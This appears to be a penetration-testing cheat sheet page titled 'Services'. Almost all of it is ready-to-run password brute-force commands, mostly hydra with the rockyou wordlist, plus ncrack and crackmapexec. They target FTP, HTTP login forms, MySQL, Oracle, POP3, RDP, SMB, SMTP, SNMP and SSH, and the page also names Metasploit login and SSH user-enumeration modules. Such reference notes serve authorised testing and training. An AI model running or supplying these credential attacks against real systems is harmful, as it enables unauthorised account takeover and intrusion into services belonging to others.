+++
menus = 'main'
title = 'Services'
collapsibleMenu = true
alwaysopen = false

+++

## Services

FTP - Known user and rockyou password list

```bash
hydra -t 1 -l $user -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
```

HTTP - hydra http-post request known user

```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip http-post-form "<Login Page>:<Request Body>:<Error Message>" -v -V
```

HTTP - hydra http-get request known users

```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt -f $ip http-get /svn -V -I
```

MYSQL - Known user and rockyou password list

```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip mysql
```

MYSQL - Username list and rockyou password list

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $ip mysql
```

MYSQL - Metasploit

```bash
use auxiliary/scanner/mysql/mysql_login
```

ORACLE - Hydra password attack rockyou password list

```bash
hydra -P /usr/share/wordlists/rockyou.txt -t 32 -s 1521 $ip oracle-listener
```

POP3 - Known user and rockyou password list

```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt -f $ip pop3 -V
```

RDP - Known user and rockyou password list

```bash
hydra -t 1 -V -f -l $user -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

RDP - Known user and rockyou password list

```bash
ncrack -vv --user $user -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

SMB - Metasploit

```bash
use auxiliary/scanner/smb/smb_login
```

SMB - Known user and rockyou password list

```bash
hydra -t 1 -V -f -l $user -P /usr/share/wordlists/rockyou.txt $ip smb
```

SMB - User & password list

```bash
crackmapexec smb $ip -u users.txt -p users.txt --continue-on-success
```

SMTP - Known user and rockyou password list

```bash
hydra -P /usr/share/wordlists/rockyou.txt $ip smtp -V
```

SNMP - Known user and rockyou password list

```bash
hydra -P /usr/share/wordlists/rockyou.txt -v $ip snmp
```

SSH - Enumerate users with metasploit

```bash
use auxiliary/scanner/ssh/ssh_enumusers
```

SSH - Quick Known user and rockyou password list

```bash
hydra $ip -s 22 ssh -l $user -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -F
```

SSH - Known user and rockyou password list

```bash
hydra $ip -s 22 ssh -l $user -P /usr/share/wordlists/rockyou.txt -V -F
```

SSH - Username list and rockyou password list

```bash
hydra -F -L users.txt -P /usr/share/wordlists/rockyou.txt -t 16 $ip
```

